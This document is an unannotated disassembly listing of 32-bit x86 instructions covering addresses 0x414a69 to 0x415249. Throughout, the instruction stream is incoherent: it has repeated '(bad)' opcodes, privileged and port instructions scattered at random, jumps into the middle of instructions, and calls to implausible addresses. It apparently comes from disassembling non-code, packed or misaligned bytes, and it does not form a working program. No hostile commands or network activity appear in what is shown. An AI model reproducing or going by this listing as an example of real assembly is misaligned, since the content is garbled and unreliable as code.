  414a69:	je     0x414a07
  414a6b:	mov    eax,edi
  414a6d:	or     al,0xf0
  414a6f:	add    BYTE PTR [ebp+0x458bf845],al
  414a75:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  414a7b:	adc    al,0x7
  414a7d:	enter  0x9fc0,0xa5
  414a81:	rol    BYTE PTR [eax],0x5e
  414a84:	mov    ecx,ecx
  414a86:	or     al,0xc
  414a88:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  414a8f:	jmp    0x414a90
  414a91:	push   ebp
  414a92:	mov    esp,ebp
  414a94:	cld    
  414a95:	inc    ebp
  414a96:	inc    ebp
  414a97:	or     DWORD PTR [ecx+0x457dec10],0x0
  414a9e:	push   esi
  414a9f:	push   esi
  414aa0:	mov    edi,0x7af080f
  414aa5:	add    bh,al
  414aa7:	test   DWORD PTR [edi+ecx*1+0x3a732],ebx
  414aae:	mov    DWORD PTR [edi],ecx
  414ab0:	adc    BYTE PTR [eax+0x45],al
  414ab3:	mov    ebp,eax
  414ab5:	mov    ebp,edi
  414ab7:	lock call edx
  414aba:	fcom   DWORD PTR [ebp+0x45]
  414abd:	mov    eax,0x148a8b
  414ac2:	push   ecx
  414ac3:	enter  0xc145,0x83
  414ac7:	cmp    ecx,DWORD PTR [eax]
  414ac9:	add    BYTE PTR [ebp+0x4d],al
  414acc:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  414ad2:	call   0xffa14641
  414ad7:	cmp    eax,DWORD PTR [ebp-0xc]
  414ada:	jmp    DWORD PTR [eax+edx*1-0x4e]
  414ade:	push   ebp
  414adf:	(bad)  
  414ae0:	call   0x3248e4
  414ae5:	mov    bh,0xdb
  414ae7:	cld    
  414ae8:	or     BYTE PTR [ebp+0x45],bl
  414aeb:	(bad)  
  414aec:	call   0xff7b477c
  414af1:	add    al,BYTE PTR [ebp+0x37]
  414af4:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  414afa:	jne    0x414afc
  414afc:	(bad)  
  414afd:	cmp    edi,esp
  414aff:	jne    0x414b32
  414b01:	mov    edi,edi
  414b03:	or     BYTE PTR [ebx-0x307f0b49],cl
  414b09:	pop    ds
  414b0a:	into   
  414b0b:	je     0x414ace
  414b0d:	mov    ebx,DWORD PTR [esi]
  414b0f:	or     BYTE PTR [ebp-0x49],al
  414b12:	mov    esp,DWORD PTR [esi-0x77]
  414b15:	mov    esi,0x4451f0c
  414b1a:	mov    eax,DWORD PTR [eax]
  414b1c:	or     al,0x66
  414b1e:	sar    bl,0x3b
  414b21:	xor    esi,DWORD PTR [ebp+0x66]
  414b24:	xor    ecx,edi
  414b26:	pop    edi
  414b27:	adc    bl,BYTE PTR [ebx+0x70]
  414b2a:	ret    0xff
  414b2d:	cld    
  414b2e:	inc    ebp
  414b2f:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  414b35:	cld    
  414b36:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  414b3d:	push   0xffffff83
  414b3f:	pop    edi
  414b40:	or     BYTE PTR [ebp+0x53],dh
  414b43:	xorps  xmm1,xmm2
  414b46:	test   BYTE PTR [eax+eax*1],bh
  414b49:	add    BYTE PTR [eax],al
  414b4b:	adc    eax,eax
  414b4d:	add    DWORD PTR [eax+esi*2-0xff7b00],0xffffffb7
  414b55:	jmp    DWORD PTR [eax]
  414b57:	ror    al,0x5e
  414b5a:	inc    ebp
  414b5b:	leave  
  414b5c:	xor    ecx,DWORD PTR [eax]
  414b5e:	and    DWORD PTR [ebx-0x3ec10708],ecx
  414b64:	add    ah,al
  414b66:	xor    edi,edi
  414b68:	xor    DWORD PTR [ebx],0x66003304
  414b6e:	mov    DWORD PTR [ebp-0xc],ecx
  414b71:	pcmpgtw mm0,mm0
  414b74:	add    dl,ah
  414b76:	leave  
  414b77:	mov    edi,DWORD PTR [esi-0x7d]
  414b7a:	push   ax
  414b7c:	dec    ebp
  414b7d:	mov    esi,DWORD PTR [ebx-0x75]
  414b80:	lea    ebp,[eax-0x7c00ff04]
  414b86:	xor    eax,DWORD PTR [eax]
  414b88:	sysret 
  414b8a:	dec    ebp
  414b8b:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  414b92:	push   WORD PTR [ecx+0x8]
  414b96:	jne    0x414b59
  414b98:	ud0    ecx,DWORD PTR [ecx]
  414b9b:	mov    eax,edx
  414b9d:	lods   al,BYTE PTR ds:[esi]
  414b9e:	add    BYTE PTR [eax],al
  414ba0:	data16 (bad) 
  414ba2:	iret   
  414ba3:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  414baa:	cli    
  414bab:	inc    ebp
  414bac:	cmp    al,0x8d
  414bae:	add    BYTE PTR [esi+0x2d],ah
  414bb1:	inc    ebp
  414bb2:	pop    ebp
  414bb3:	lea    ecx,[edi]
  414bb5:	mov    dl,bh
  414bb7:	add    BYTE PTR [edi],cl
  414bb9:	mov    DWORD PTR [eax+eax*8],edi
  414bbc:	mov    ebx,0x3b87
  414bc1:	add    BYTE PTR [ebx],ch
  414bc3:	inc    ebp
  414bc4:	data16 (bad) 
  414bc6:	clc    
  414bc7:	int3   
  414bc8:	cmp    eax,DWORD PTR [eax]
  414bca:	je     0x414b55
  414bcc:	push   0xffffffc8
  414bce:	pop    edi
  414bcf:	xchg   DWORD PTR [ebp+0x0],eax
  414bd2:	data16 add BYTE PTR [ebp+0x45],cl
  414bd6:	lea    cx,[ebp+0x10]
  414bda:	jb     0x414bdc
  414bdc:	jmp    0x414b67
  414bde:	call   eax
  414be0:	clc    
  414be1:	xchg   DWORD PTR [edi+0x1],edi
  414be4:	mov    eax,DWORD PTR [eax]
  414be6:	or     BYTE PTR [ebp-0x49],al
  414be9:	lea    eax,[eax+0x74003154]
  414bef:	push   edi
  414bf0:	inc    edx
  414bf1:	jge    0x414bf2
  414bf3:	mov    DWORD PTR [edi],ecx
  414bf5:	fdiv   DWORD PTR [edi-0x6]
  414bf8:	inc    DWORD PTR [eax]
  414bfa:	xor    edx,DWORD PTR [eax+0x5f]
  414bfd:	xchg   DWORD PTR [ebx+0x1],ebx
  414c00:	ret    0x0
  414c03:	xor    BYTE PTR [ebp-0x51],cl
  414c06:	cmp    edi,0xf0ff89fc
  414c0c:	data16 ror al,0x84
  414c10:	rol    BYTE PTR [eax],0x3b
  414c13:	add    al,dh
  414c15:	dec    eax
  414c16:	xchg   esp,eax
  414c17:	push   ebx
  414c18:	jmp    0x414ba5
  414c1a:	push   ebp
  414c1b:	add    esp,ebp
  414c1d:	add    ebp,esp
  414c1f:	mov    edx,DWORD PTR [edi+0x24]
  414c22:	clc    
  414c23:	dec    esi
  414c24:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  414c2a:	cmp    BYTE PTR [ebx],al
  414c2c:	jne    0x414bb7
  414c2e:	xor    esp,eax
  414c30:	jmp    0x444db3
  414c35:	add    ebp,DWORD PTR [ecx+ecx*4]
  414c38:	jne    0x414c2e
  414c3a:	call   0xffcb4994
  414c3f:	clc    
  414c40:	xchg   edi,eax
  414c41:	sti    
  414c42:	add    DWORD PTR [ebx],eax
  414c44:	add    BYTE PTR [ebp+0x47],bl
  414c47:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  414c4d:	pop    ebp
  414c4e:	mov    DWORD PTR [esi-0x48],esi
  414c51:	jmp    0x414c9a
  414c53:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  414c59:	(bad)  
  414c5b:	cmp    al,0x0
  414c5d:	cmp    eax,DWORD PTR [ebp+0x18]
  414c60:	lea    ebx,[ebp-0x56]
  414c63:	jle    0x414c65
  414c65:	jae    0x414bf0
  414c67:	mov    eax,esp
  414c69:	call   0xb900:0x8b005587
  414c70:	inc    ebp
  414c71:	push   ebp
  414c72:	lea    ecx,[ebp-0x27ff4f12]
  414c78:	mov    eax,edi
  414c7a:	int3   
  414c7b:	push   ebp
  414c7c:	xchg   edi,eax
  414c7e:	add    esp,ebp
  414c80:	add    BYTE PTR [eax],al
  414c82:	inc    ebp
  414c83:	add    BYTE PTR [ebp+0x8b3255],cl
  414c89:	cld    
  414c8a:	mov    DWORD PTR [edx],edi
  414c8c:	aam    0x75
  414c8e:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  414c94:	mov    DWORD PTR [ebx-0x50],edx
  414c97:	test   BYTE PTR [ebp-0x1],0xe8
  414c9b:	mov    eax,DWORD PTR [eax]
  414c9d:	hlt    
  414c9e:	add    al,al
  414ca0:	mov    eax,DWORD PTR ds:0x890045a8
  414ca6:	dec    DWORD PTR [ebx+0x45fdf0e8]
  414cac:	inc    DWORD PTR [eax*2+0xf75854d]
  414cb3:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  414cb9:	call   0x7297a9fa
  414cbe:	je     0x414d1e
  414cc0:	js     0x414d21
  414cc2:	lock ret 0x7e
  414cc6:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  414ccc:	mov    edi,edi
  414cce:	sbb    al,bl
  414cd0:	clc    
  414cd1:	add    BYTE PTR [ebp-0x73],bh
  414cd4:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  414cda:	ror    BYTE PTR [eax],1
  414cdc:	dec    ebp
  414cdd:	xchg   ebp,eax
  414cde:	mov    edi,edi
  414ce0:	in     al,0x8b
  414ce2:	jge    0x414c6d
  414ce4:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  414cea:	clc    
  414ceb:	pop    esi
  414cec:	fist   DWORD PTR [ebp+0x5d398b5d]
  414cf2:	clc    
  414cf3:	add    al,0x6e
  414cf5:	mov    eax,DWORD PTR [ebx]
  414cf7:	mov    BYTE PTR [ebp+0x0],dl
  414cfa:	mov    edx,DWORD PTR [ebx-0x20]
  414cfd:	adc    esi,DWORD PTR [edi+0x5e005f3e]
  414d03:	add    eax,0x3b3b73
  414d08:	adc    al,0x89
  414d0a:	pop    eax
  414d0b:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  414d0f:	ret    0xf08
  414d12:	cmp    al,0x2
  414d14:	mov    edx,eax
  414d16:	cld    
  414d17:	add    BYTE PTR [ebp+0x66],dl
  414d1a:	add    eax,ebx
  414d1c:	add    esp,eax
  414d1e:	sub    eax,eax
  414d20:	or     BYTE PTR [ecx-0x77f474bb],cl
  414d26:	add    BYTE PTR [eax],al
  414d28:	mov    DWORD PTR [ebx-0x24],ebx
  414d2b:	push   edi
  414d2c:	push   ebp
  414d2d:	clc    
  414d2e:	add    DWORD PTR [esi+0x1b0100],0x45
  414d35:	out    0xff,eax
  414d37:	add    edx,DWORD PTR [eax]
  414d39:	jmp    0x414d23
  414d3b:	cmp    ch,0x47
  414d3e:	(bad)  
  414d3f:	jmp    0x40c6d591
  414d44:	je     0x414cd0
  414d46:	mov    eax,DWORD PTR [eax-0x10c78f04]
  414d4c:	inc    ebp
  414d4d:	add    BYTE PTR [ebx-0x770375],al
  414d53:	add    ah,ch
  414d55:	add    edx,esp
  414d57:	pop    edi
  414d58:	pop    ebp
  414d59:	push   ebp
  414d5a:	inc    ebx
  414d5b:	in     al,dx
  414d5c:	pop    ebp
  414d5d:	in     al,dx
  414d5e:	cmp    edx,DWORD PTR [edi-0x8]
  414d61:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  414d68:	add    al,0x47
  414d6a:	push   ebp
  414d6b:	mov    esp,ebp
  414d6d:	in     al,0x45
  414d6f:	dec    ebp
  414d70:	push   esi
  414d71:	test   DWORD PTR [eax+0xfb010f],esi
  414d77:	add    BYTE PTR [eax+0xc018b],dh
  414d7d:	leave  
  414d7e:	inc    ebp
  414d7f:	test   al,ch
  414d81:	add    dh,bh
  414d83:	add    bh,bh
  414d85:	dec    ebp
  414d86:	push   cs
  414d87:	mov    DWORD PTR [ecx],eax
  414d89:	hlt    
  414d8a:	push   es
  414d8b:	dec    ebp
  414d8c:	leave  
  414d8d:	mov    DWORD PTR [eax],ecx
  414d8f:	clc    
  414d90:	cmovge eax,ecx
  414d93:	mov    ecx,0x85c2f0
  414d99:	clc    
  414d9a:	pop    DWORD PTR [ebp+0x1]
  414d9d:	push   ebx
  414d9e:	add    BYTE PTR [ebp-0x15],bh
  414da1:	push   esi
  414da2:	xor    eax,0x898a45
  414da7:	cld    
  414da8:	add    al,0x45
  414daa:	add    BYTE PTR [ebx],dh
  414dac:	pushfw 
  414dae:	add    DWORD PTR [esi+0x78308c1],edi
  414db4:	add    ah,BYTE PTR [edi+esi*4-0x33]
  414db8:	mov    ebx,0xc4e8b
  414dbd:	(bad)  
  414dbe:	cmp    ecx,ebx
  414dc0:	jne    0x414d8a
  414dc2:	xor    ecx,DWORD PTR [ebp+0x66]
  414dc5:	jmp    0xc84dcb
  414dca:	add    DWORD PTR [ebp+0x0],eax
  414dcd:	mov    eax,ebx
  414dcf:	or     al,0x8b
  414dd1:	(bad)  
  414dd2:	mov    ecx,esi
  414dd4:	mov    BYTE PTR [eax+eax*1+0x664c138],cl
  414ddb:	mov    eax,edi
  414ddd:	or     BYTE PTR [edx],cl
  414ddf:	shl    cl,cl
  414de1:	icebp  
  414de2:	add    BYTE PTR [ebp+0x37],0x8b
  414de6:	or     BYTE PTR [edx+eax*2],cl
  414de9:	(bad)  
  414dea:	or     cl,dh
  414dec:	stc    
  414ded:	shl    DWORD PTR [ebp-0x30],0xc6
  414df1:	xor    al,0x0
  414df3:	inc    ebp
  414df4:	xchg   BYTE PTR [ebx],al
  414df6:	add    esp,edi
  414df8:	add    BYTE PTR [ebp-0x39],cl
  414dfb:	mov    al,bl
  414dfd:	test   DWORD PTR [ebx+0x1c348375],ecx
  414e03:	sub    al,0xbf
  414e05:	jmp    0x414d8c
  414e07:	mov    edi,eax
  414e09:	lock jge 0x414dfd
  414e0c:	lea    esi,[edx-0x74bad501]
  414e12:	mov    ebp,esp
  414e14:	or     cl,dh
  414e16:	leave  
  414e17:	add    al,BYTE PTR [eax+eax*4-0x37ff9c00]
  414e1e:	dec    ebp
  414e1f:	dec    ebp
  414e20:	test   DWORD PTR [ebx],eax
  414e22:	paddb  mm6,mm0
  414e25:	add    DWORD PTR [eax],eax
  414e27:	dec    ebp
  414e28:	mov    ecx,DWORD PTR [ebx-0x63b217f0]
  414e2e:	mov    esi,DWORD PTR [edx]
  414e30:	or     al,0x2b
  414e32:	dec    ebp
  414e33:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  414e39:	mov    esp,esi
  414e3b:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  414e42:	mov    DWORD PTR [ebx],ebp
  414e44:	call   0xc74d774
  414e49:	mov    DWORD PTR [ebp+0x10],ecx
  414e4c:	(bad)  
  414e4d:	push   0x8b85ff10
  414e52:	clc    
  414e53:	or     al,0x55
  414e55:	(bad)  
  414e56:	push   ecx
  414e57:	retf   
  414e58:	mov    ebx,0xff4d8dc8
  414e5d:	mov    DWORD PTR [ebp+0x8],eax
  414e60:	xor    eax,DWORD PTR [ebp-0x75]
  414e63:	cmp    ebp,DWORD PTR [ebx]
  414e65:	lsl    ebx,WORD PTR [edi-0x8]
  414e69:	call   DWORD PTR [ebx-0x741bff75]
  414e6f:	(bad)  
  414e70:	or     al,0x5b
  414e72:	dec    ebp
  414e73:	or     BYTE PTR [ebx],dh
  414e75:	inc    ebp
  414e76:	xor    esi,DWORD PTR ds:0x708088d
  414e7c:	in     eax,0x9c
  414e7e:	add    BYTE PTR [edx],dh
  414e80:	inc    ebp
  414e81:	pop    edi
  414e82:	xor    eax,edx
  414e84:	test   DWORD PTR [eax],0x83108b8b
  414e8a:	dec    ebp
  414e8b:	adc    al,0x33
  414e8d:	inc    ebp
  414e8e:	xor    esi,DWORD PTR [ecx]
  414e90:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  414e97:	test   DWORD PTR [eax],ecx
  414e99:	clc    
  414e9a:	inc    ebp
  414e9b:	add    ecx,DWORD PTR [ebx+0xc7f445]
  414ea1:	hlt    
  414ea2:	leave  
  414ea3:	test   DWORD PTR [esi],eax
  414ea5:	clc    
  414ea6:	inc    edi
  414ea7:	push   edi
  414ea8:	aaa    
  414ea9:	inc    ebp
  414eaa:	pop    ss
  414eab:	ror    DWORD PTR [ebp-0x29],1
  414eae:	or     BYTE PTR [ebx+0x4d64fc55],0xd1
  414eb5:	mov    eax,0x780084d
  414eba:	push   ebp
  414ebb:	clc    
  414ebc:	ret    0xe99c
  414ebf:	xor    dl,dl
  414ec1:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  414ec7:	js     0x887dac6
  414ecd:	dec    ebp
  414ece:	push   ebp
  414ecf:	mov    edi,DWORD PTR [eax+0xc872fc]
  414ed5:	lock enter 0xceca,0xf2
  414eda:	retf   0x18ce
  414edd:	jne    0x414f2c
  414edf:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  414ee5:	enter  0xf0d6,0xca
  414ee9:	retf   0xf2c8
  414eec:	into   
  414eed:	out    dx,al
  414eee:	dec    ebp
  414eef:	dec    ebp
  414ef0:	jmp    0xff454e28
  414ef5:	xor    eax,DWORD PTR [ebp-0x15]
  414ef8:	xor    esi,DWORD PTR [ebx]
  414efa:	mov    esi,DWORD PTR [ebx]
  414efc:	sub    eax,DWORD PTR [ebx]
  414efe:	add    eax,DWORD PTR [ebx]
  414f00:	or     bl,dl
  414f02:	dec    ebp
  414f03:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  414f09:	xor    eax,DWORD PTR [ebp-0xf00073]
  414f0f:	jb     0x414f56
  414f11:	add    BYTE PTR [ebx],dh
  414f13:	dec    ebp
  414f14:	pop    esi
  414f15:	mov    ebp,ebx
  414f17:	cld    
  414f18:	mov    esi,eax
  414f1a:	call   0x520fa4e7
  414f1f:	stc    
  414f20:	add    eax,0x4572aa
  414f25:	pop    edi
  414f26:	leave  
  414f27:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  414f2e:	in     al,dx
  414f2f:	mov    eax,edi
  414f31:	xor    eax,0xf8008520
  414f37:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  414f3e:	mov    eax,DWORD PTR [ebp-0x77]
  414f41:	xor    al,bh
  414f43:	pushf  
  414f44:	inc    ebp
  414f45:	(bad)  
  414f46:	cmp    eax,ebp
  414f48:	pushf  
  414f49:	xchg   BYTE PTR [esi-0x8],dl
  414f4c:	mov    edi,0x8518e4ec
  414f52:	jmp    0xf056:0x8b457df8
  414f59:	push   ebp
  414f5a:	push   ebp
  414f5b:	push   ecx
  414f5c:	push   ecx
  414f5d:	push   edi
  414f5e:	xor    eax,esi
  414f60:	mov    edx,0x32729c
  414f65:	add    ecx,eax
  414f67:	mov    edx,edi
  414f69:	clc    
  414f6a:	retf   0xaf45
  414f6d:	cmp    ebx,ebp
  414f6f:	pushf  
  414f70:	mov    eax,edi
  414f72:	clc    
  414f73:	cld    
  414f74:	jne    0x414f8e
  414f76:	xor    ebp,edx
  414f78:	xor    eax,DWORD PTR [ebp+0x3]
  414f7b:	or     BYTE PTR [ebx],al
  414f7d:	add    BYTE PTR [ebp-0x7747475],al
  414f83:	hlt    
  414f84:	dec    ebp
  414f85:	dec    ebp
  414f86:	je     0x414fbb
  414f88:	xor    esi,DWORD PTR [ebx]
  414f8a:	xor    eax,DWORD PTR [ebx]
  414f8c:	add    eax,DWORD PTR [ebx]
  414f8e:	add    ecx,DWORD PTR [edi]
  414f90:	rol    ecx,cl
  414f92:	mov    esi,DWORD PTR [ecx]
  414f94:	in     al,dx
  414f95:	inc    ebp
  414f96:	enter  0xca2b,0x33
  414f9a:	icebp  
  414f9b:	mov    DWORD PTR [edx],ecx
  414f9d:	clc    
  414f9e:	lock pop ebp
  414fa0:	enter  0xf2e8,0xfe
  414fa4:	retf   0xeeff
  414fa7:	inc    ebp
  414fa8:	jne    0x414f35
  414faa:	mov    edi,eax
  414fac:	cld    
  414fad:	dec    ebp
  414fae:	enter  0xbc89,0x8d
  414fb2:	pushf  
  414fb3:	sti    
  414fb4:	xor    bh,bh
  414fb6:	mov    eax,DWORD PTR [ebp-0xc]
  414fb9:	mov    esi,DWORD PTR [ebp-0x4]
  414fbc:	xor    eax,esi
  414fbe:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9c]
  414fc5:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  414fcb:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  414fd1:	(bad)  
  414fd2:	push   ebp
  414fd3:	shr    esp,0x4d
  414fd6:	in     al,dx
  414fd7:	cmp    eax,DWORD PTR [esi+esi*2]
  414fda:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  414fe0:	pushf  
  414fe1:	mov    edi,0x85c7f445
  414fe7:	call   0xf886d6e4
  414fec:	xor    ebx,ebx
  414fee:	pushf  
  414fef:	popa   
  414ff0:	push   ebx
  414ff1:	dec    ebp
  414ff2:	inc    ebp
  414ff3:	mov    esi,DWORD PTR [esi]
  414ff5:	clc    
  414ff6:	pushf  
  414ff7:	into   
  414ff8:	mov    ecx,edi
  414ffa:	in     al,dx
  414ffb:	call   0x8b4995be
  415000:	pop    es
  415001:	or     BYTE PTR [ebx],dh
  415003:	or     BYTE PTR [edi+0x8a724d],bh
  415009:	or     eax,edi
  41500b:	push   ebp
  41500c:	inc    ebp
  41500d:	cmpxchg8b (bad)
  41500e:	(bad)  
  41500f:	leave  
  415010:	loopne 0x414fdc
  415012:	test   DWORD PTR [ebp-0x8],ecx
  415015:	mov    eax,DWORD PTR [ebp-0x18]
  415018:	rcl    DWORD PTR [ebp-0x29],1
  41501b:	xor    eax,edi
  41501d:	add    esi,eax
  41501f:	and    eax,DWORD PTR [eax]
  415021:	mov    eax,DWORD PTR [eax]
  415023:	(bad)  
  415024:	leave  
  415025:	sti    
  415026:	inc    ebp
  415027:	dec    DWORD PTR [ebx-0x39cc13ab]
  41502d:	mov    esi,ecx
  41502f:	clc    
  415030:	(bad)  
  415031:	dec    ebp
  415032:	iret   
  415033:	xor    ebp,DWORD PTR [edi-0x74f71473]
  415039:	jb     0x415037
  41503b:	add    bh,al
  41503d:	inc    ebp
  41503e:	(bad)  
  41503f:	mov    eax,DWORD PTR [ebp-0xc]
  415042:	(bad)  
  415043:	xabort 0x64
  415046:	loopne 0x415015
  415048:	jmp    FWORD PTR [ebx]
  41504a:	mov    DWORD PTR [ebx],eax
  41504c:	clc    
  41504d:	lock inc ebp
  41504f:	dec    ebp
  415050:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  415056:	loopne 0x41508b
  415058:	inc    DWORD PTR [ebx]
  41505a:	mov    edi,DWORD PTR [ebx]
  41505c:	hlt    
  41505d:	jne    0x4150ac
  41505f:	mov    esi,DWORD PTR [ebx]
  415061:	in     al,0x8d
  415063:	dec    ebp
  415064:	or     BYTE PTR [ebx],dh
  415066:	jb     0x41506b
  415068:	add    BYTE PTR [edi+0x45],bl
  41506b:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  415071:	add    BYTE PTR [ebx],dh
  415073:	mov    esi,DWORD PTR [ebx]
  415075:	sub    DWORD PTR [ebx],0x6c
  415078:	mov    eax,DWORD PTR [ebp-0x4]
  41507b:	xor    eax,ecx
  41507d:	pushf  
  41507e:	mov    ecx,0x338545ba
  415083:	clc    
  415084:	add    edx,DWORD PTR [ebp-0x77]
  415087:	mov    edi,eax
  415089:	adc    al,0x45
  41508b:	inc    ebp
  41508c:	mov    ebx,DWORD PTR ss:[esp+edx*1+0x1eb808b]
  415094:	mov    eax,DWORD PTR [eax]
  415096:	loopne 0x4150e5
  415098:	inc    ebp
  415099:	mov    esi,DWORD PTR [ebx]
  41509b:	mov    eax,DWORD PTR [ebx]
  41509d:	nop
  41509e:	rol    DWORD PTR [eax],cl
  4150a0:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  4150a6:	mov    cl,BYTE PTR [ecx+0x450bf888]
  4150ac:	dec    ebp
  4150ad:	push   esi
  4150ae:	mov    edi,DWORD PTR [edi+0x7b608f8]
  4150b4:	xor    eax,edi
  4150b6:	mov    DWORD PTR [eax+ecx*1-0x74fcb2ce],ebx
  4150bd:	mov    DWORD PTR [eax],ecx
  4150bf:	in     al,dx
  4150c0:	into   
  4150c1:	inc    ebp
  4150c2:	iret   
  4150c3:	xor    ecx,edx
  4150c5:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  4150cc:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  4150d2:	dec    ebp
  4150d3:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  4150d9:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9c]
  4150e0:	mov    DWORD PTR [ecx+0x8],eax
  4150e3:	mov    eax,DWORD PTR [ebp-0x8]
  4150e6:	xor    ebx,DWORD PTR [eax]
  4150e8:	mov    ecx,0xff8b8d40
  4150ed:	clc    
  4150ee:	enter  0x4d49,0x48
  4150f2:	mov    eax,edx
  4150f4:	lock enter 0x4545,0x8b
  4150f9:	mov    esi,eax
  4150fb:	cmp    dh,al
  4150fd:	rol    edi,0x3
  415100:	enter  0x9140,0x89
  415104:	inc    ebp
  415105:	adc    al,0x8b
  415107:	inc    ebp
  415108:	clc    
  415109:	xor    eax,esi
  41510b:	add    eax,edi
  41510d:	mov    DWORD PTR [esi-0x24],ebx
  415110:	rol    DWORD PTR [ebp-0x37],0x33
  415114:	add    al,0x3
  415116:	push   ebp
  415117:	mov    esp,ebp
  415119:	fsubr  st,st(4)
  41511b:	inc    ebp
  41511c:	(bad)  
  41511d:	mov    edi,esp
  41511f:	adc    BYTE PTR [ebp+0x30c3f8c7],al
  415125:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  41512c:	inc    ebp
  41512d:	test   DWORD PTR [ecx+0x454514f8],ecx
  415133:	xor    cl,BYTE PTR [ebx+0xc7909c]
  415139:	fmul   DWORD PTR [ebx+0xf81485]
  41513f:	test   DWORD PTR [ecx+0x8b0100],ecx
  415145:	cld    
  415146:	or     edi,eax
  415148:	dec    eax
  415149:	ret    
  41514a:	push   ebx
  41514b:	inc    ebp
  41514c:	dec    ebp
  41514d:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  415153:	mov    DWORD PTR [ebp-0x14],edx
  415156:	push   ecx
  415157:	jne    0x41518c
  415159:	mov    edi,DWORD PTR [ebx+0x4d720c]
  41515f:	call   0xff874327
  415164:	mov    eax,DWORD PTR [ebp-0x4]
  415167:	mov    edi,0x4585c3d8
  41516d:	clc    
  41516e:	mov    eax,DWORD PTR [ebp-0x8]
  415171:	xor    eax,DWORD PTR [eax+0x3]
  415174:	adc    DWORD PTR [eax+0xc],0x45
  415178:	inc    ebp
  415179:	push   eax
  41517a:	mov    ebx,ebp
  41517c:	clc    
  41517d:	inc    DWORD PTR [eax-0x75]
  415180:	mov    esi,eax
  415182:	clc    
  415183:	rol    BYTE PTR [ebp+0x4545544e],0x33
  41518a:	je     0x41518f
  41518c:	mov    edx,DWORD PTR [eax+0x38]
  41518f:	jne    0x4151de
  415191:	lea    ecx,[ebx-0x817ab44]
  415197:	mul    BYTE PTR [ebx]
  415199:	dec    DWORD PTR [ebx+0x4089f845]
  41519f:	fadd   DWORD PTR [ebx]
  4151a1:	inc    ebp
  4151a2:	jmp    0x41512f
  4151a4:	mov    ecx,DWORD PTR [esp+edx*2]
  4151a7:	rol    DWORD PTR [ebp+0x45],0x8b
  4151ab:	mov    edi,esp
  4151ad:	lock (bad) 
  4151af:	dec    ebp
  4151b0:	ret    
  4151b1:	mov    eax,DWORD PTR [ebp+0x10]
  4151b4:	mov    eax,DWORD PTR [ecx-0x4]
  4151b7:	mov    eax,edi
  4151b9:	fadd   st,st(3)
  4151bb:	enter  0x1645,0x8b
  4151bf:	inc    ebp
  4151c0:	cld    
  4151c1:	mov    ecx,DWORD PTR [ebp+0xc]
  4151c4:	xor    ecx,DWORD PTR [ebp+0x3]
  4151c7:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  4151cd:	sub    eax,DWORD PTR [ebp-0x17]
  4151d0:	xor    eax,DWORD PTR [edx]
  4151d2:	pushf  
  4151d3:	add    bh,al
  4151d5:	or     al,0xd8
  4151d7:	jne    0x41515e
  4151d9:	(bad)  
  4151da:	clc    
  4151db:	mov    al,0x45
  4151dd:	call   0xffde481f
  4151e2:	jmp    0xdd5518
  4151e7:	mov    DWORD PTR [ebp-0x30],eax
  4151ea:	xor    eax,DWORD PTR [ebp+0x3]
  4151ed:	xor    BYTE PTR [ecx+0x45c7f49c],cl
  4151f3:	enter  0x8503,0xc
  4151f7:	clc    
  4151f8:	inc    ebp
  4151f9:	inc    ebp
  4151fa:	push   DWORD PTR [edx]
  4151fc:	in     al,dx
  4151fd:	pushf  
  4151fe:	jne    0x41518d
  415200:	mov    edx,eax
  415202:	clc    
  415203:	dec    ebp
  415204:	out    dx,eax
  415205:	(bad)  
  415206:	dec    esp
  415208:	mov    DWORD PTR [ebp-0x10],ecx
  41520b:	lea    eax,[ebp-0x38]
  41520e:	cmp    DWORD PTR [ebp-0x64],ecx
  415211:	lea    ecx,[ebx-0x38b2273c]
  415217:	mov    eax,ebx
  415219:	cld    
  41521a:	(bad)  
  41521b:	iret   
  41521c:	mov    esp,0xf74de8cb
  415221:	jmp    0x865425
  415226:	test   DWORD PTR [ebx],esi
  415228:	je     0x4151c6
  41522a:	mov    ecx,DWORD PTR [edi]
  41522c:	fdivr  st,st(6)
  41522e:	mov    DWORD PTR [eax],0xe8ff8bc3
  415234:	lock iret 
  415236:	inc    ebp
  415237:	lock push eax
  415239:	retf   
  41523a:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  415241:	test   DWORD PTR [ebp-0x7c],0x32d89c8b
  415248:	dec    ebp
  415249:	mov    DWORD PTR [ebx],ebp
